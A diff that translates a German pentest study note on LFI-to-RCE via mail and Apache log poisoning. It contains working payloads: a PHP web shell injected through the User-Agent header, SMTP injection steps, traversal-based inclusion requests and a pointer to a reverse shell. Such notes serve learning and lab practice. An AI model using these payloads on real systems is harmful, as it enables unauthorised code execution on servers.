@@ -4,15 +4,15 @@ aliases: [Log Poisoning, LFI to RCE]
 ---
 # Mail / Log Poisoning (LFI → RCE)
 
-> Eine Datei, die der Server später per LFI einbindet, mit PHP-Code "vergiften". Beim Einbinden wird der Code ausgeführt => **RCE**.
+> "Poison" a file that the server later includes via LFI with PHP code. On inclusion the code is executed => **RCE**.
 
-## Prinzip
-1. Datei mit steuerbarem Inhalt wählen (Mailbox, Log).
-2. PHP-Payload hineinschreiben.
-3. Datei via LFI einbinden → PHP läuft.
+## Principle
+1. Pick a file with controllable content (mailbox, log).
+2. Write a PHP payload into it.
+3. Include the file via LFI → PHP runs.
 
-## Mail als Träger
-Mailbox liegt in `/var/mail/<user>`. Mail per SMTP (Port 25) einschleusen – [[telnet]] / [[netcat]]:
+## Mail as carrier
+The mailbox lives in `/var/mail/<user>`. Inject mail via SMTP (port 25) – [[telnet]] / [[netcat]]:
 ```smtp
 HELO x
 MAIL FROM: <a@x>
@@ -25,43 +25,43 @@ Subject: pwn
 QUIT
 ```
 > [!warning] `454 Relay access denied`
-> Server nimmt nur eigene Domains. Begrüßung verrät den echten Hostnamen → `user@localhost` oder `user@<hostname>` nehmen.
+> The server only accepts its own domains. The greeting reveals the real hostname → use `user@localhost` or `user@<hostname>`.
 
-## Log als Träger (Apache access.log)
-Jeder HTTP-Request landet im Zugriffslog. Das letzte Feld ist der **`User-Agent`** – vom Client frei wählbar und ungeprüft geloggt → idealer Träger.
+## Log as carrier (Apache access.log)
+Every HTTP request ends up in the access log. The last field is the **`User-Agent`** – freely chosen by the client and logged unchecked → an ideal carrier.
 
-> [!info] Welcher Logpfad?
-> Logpfade liegen je Server/OS **immer am selben Ort** → blind durchtesten. Vollständige Tabelle: [[Linux Standard-Pfade]]. Häufigster Treffer: `/var/log/apache2/access.log`.
+> [!info] Which log path?
+> Log paths always sit in the same place per server/OS → test blindly. Full table: [[Linux Standard Paths]]. Most common hit: `/var/log/apache2/access.log`.
 
-**(1)** PHP-Payload als User-Agent in den Log schreiben – [[curl]]:
+**(1)** Write the PHP payload as the User-Agent into the log – [[curl]]:
 ```bash
-curl http://ziel/ \
+curl http://target/ \
   -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
   -b "PHPSESSID=<session>"
 ```
-**(2)** Log via LFI einbinden + Befehl über GET-Parameter auslösen:
+**(2)** Include the log via LFI + trigger the command via GET parameter:
 ```bash
-curl "http://ziel/dashboard.php?cmd=id" \
+curl "http://target/dashboard.php?cmd=id" \
   -b "PHPSESSID=<session>" \
   --data-urlencode "file=/var/log/apache2/access.log"
 ```
-> [!note] POST-Body vs. URL-Parameter
-> Hier liest die Seite die Datei über einen **POST-Parameter** (`file=`), die Webshell nimmt den Befehl aber über den **GET-Parameter** (`?cmd=`). Beides muss im selben Request stehen.
+> [!note] POST body vs. URL parameter
+> Here the page reads the file via a **POST parameter** (`file=`), but the web shell takes the command via the **GET parameter** (`?cmd=`). Both must be in the same request.
 
-> [!tip] `$` escapen
-> In doppelten Quotes der Shell muss `\$_GET` escaped werden, sonst expandiert die lokale Bash die Variable weg.
+> [!tip] Escape `$`
+> Inside the shell's double quotes, `\$_GET` must be escaped, otherwise the local bash expands the variable away.
 
-## Webshell-Payload
+## Web shell payload
 ```php
 <?php system($_GET['cmd']); ?>
 ```
-- `system()` = führt Shell-Befehl aus
-- `$_GET['cmd']` = Befehl aus URL => **1 Datei, beliebig viele Befehle**
+- `system()` = runs a shell command
+- `$_GET['cmd']` = command from the URL => **1 file, any number of commands**
 
-## Auslösen
+## Triggering
 ```bash
-curl -G "http://ziel/index.php" \
+curl -G "http://target/index.php" \
   --data-urlencode "page=....//....//var/mail/user" \
   --data-urlencode "cmd=id"
 ```
-=> Danach Reverse Shell für stabilen Zugang.
+=> Then set up a reverse shell for stable access.
